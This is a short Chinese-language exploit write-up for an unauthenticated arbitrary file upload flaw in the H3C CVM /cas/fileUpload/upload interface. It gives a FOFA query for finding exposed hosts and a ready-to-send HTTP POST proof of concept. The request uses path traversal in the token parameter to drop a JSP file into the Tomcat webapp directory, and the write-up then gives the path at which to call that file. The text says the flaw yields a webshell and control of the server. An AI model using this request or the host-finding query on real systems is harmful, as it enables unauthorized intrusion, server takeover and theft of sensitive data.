## H3C-CVM-upload接口前台任意文件上传漏洞复现

 H3C CVM /cas/fileUpload/upload接口存在任意文件上传漏洞，未授权的攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。

## fofa

```
app="H3C-CVM"
```

## poc

```
POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/a.jsp&name=123 HTTP/1.1
Host: your-ip
Content-Range: bytes 0-10/20
Referer: http://your-ip/cas/login
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
 
<%out.println("test");%>
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406040902939.webp)

访问文件路径

```
/cas/js/lib/buttons/a.jsp
```